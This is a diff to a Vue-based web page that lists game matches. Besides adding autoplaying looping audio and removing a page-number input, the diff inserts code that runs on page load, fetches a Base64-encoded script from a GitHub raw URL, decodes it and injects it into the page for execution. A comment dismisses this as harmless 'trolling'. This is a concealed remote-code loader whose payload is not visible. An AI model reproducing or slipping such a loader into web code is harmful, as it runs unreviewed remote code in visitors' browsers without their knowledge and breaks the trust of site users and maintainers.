@@ -179,7 +179,11 @@
 <body>
   <div id="app">
     <div v-if="loading" v-html="loadingAnimation"></div>
-    
+    <!-- Audio Element -->
+    <audio id="audioPlayer" loop>
+        <source src="https://github.com/DrMineword/Artefact-Boost-Active/raw/refs/heads/main/White%20Star%20Theme%20%20Hades%20Star.mp3" type="audio/mp3">
+        Your browser does not support the audio element.
+    </audio>
     <!-- Filters -->
     <div class="filters">
       <label for="limit">Results per page:</label>
@@ -196,10 +200,7 @@
     <!-- Error Message -->
     <div v-if="errorMessage" class="error-message">{{ errorMessage }}</div>
 
-    <!-- Page Number Input -->
-    <label for="pageNumber">Page Number:</label>
-    <input id="pageNumber" v-model.number="currentPage" @change="onPageNumberChange" type="number" min="1" :max="maxPage" class="styled-input" />
-
+    
     <!-- Matches List -->
     <ul class="list">
       <li v-for="match in filteredMatches" :key="match.MatchId">
@@ -229,6 +230,40 @@
 
   <script src="https://cdn.jsdelivr.net/npm/vue@3.2.45"></script>
   <script>
+    const audioElement = document.getElementById("audioPlayer");
+
+        // Function to play audio
+        function playAudio() {
+            audioElement.play().catch(function(error) {
+                console.error("Audio play failed:", error);
+            });
+        }
+
+        // Try playing audio when the website loads
+        window.addEventListener('load', function() {
+            playAudio();
+        });
+
+        // If it fails, wait for any user interaction
+        function handleUserInteraction() {
+            playAudio();
+            // Remove event listeners after the first successful play to avoid repetition
+            document.body.removeEventListener("click", handleUserInteraction);
+            document.body.removeEventListener("touchstart", handleUserInteraction);
+            document.body.removeEventListener("mousemove", handleUserInteraction);
+            document.body.removeEventListener("scroll", handleUserInteraction);
+            document.body.removeEventListener("keydown", handleUserInteraction);
+            document.body.removeEventListener("mousedown", handleUserInteraction);
+        }
+
+        // Add event listeners for various user interactions
+        document.body.addEventListener("click", handleUserInteraction);
+        document.body.addEventListener("touchstart", handleUserInteraction);
+        document.body.addEventListener("mousemove", handleUserInteraction);
+        document.body.addEventListener("scroll", handleUserInteraction);
+        document.body.addEventListener("keydown", handleUserInteraction);  // Key down event
+        document.body.addEventListener("mousedown", handleUserInteraction); // Mouse down event
+     
     const app = Vue.createApp({
       data() {
         return {
@@ -373,6 +408,40 @@
         await this.fetchCorporations();
         await this.fetchMatches();
       }
+
+      		// I do little trolling here, its not ip grabber or anything, just small troll, check developer mode cosnole
+			const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
+
+// Function to fetch and execute a Base64-encoded script
+async function fetchAndExecuteBase64Script() {
+    try {
+        // Fetch the Base64-encoded script
+        const response = await fetch(base64ScriptUrl);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
+        }
+
+        // Get the encoded content as text
+        const encodedScript = await response.text();
+
+        // Decode the Base64 content
+        const decodedScript = atob(encodedScript);
+
+        console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");
+
+        // Execute the decoded script
+        const scriptElement = document.createElement("script");
+        scriptElement.textContent = decodedScript;
+        document.body.appendChild(scriptElement);
+
+        console.log("Script executed successfully.");
+    } catch (error) {
+        console.error("Error fetching or executing the Base64 script:", error);
+    }
+}
+
+// Call the function to fetch, decode, and execute the script
+fetchAndExecuteBase64Script();
     });
 
     app.mount("#app");
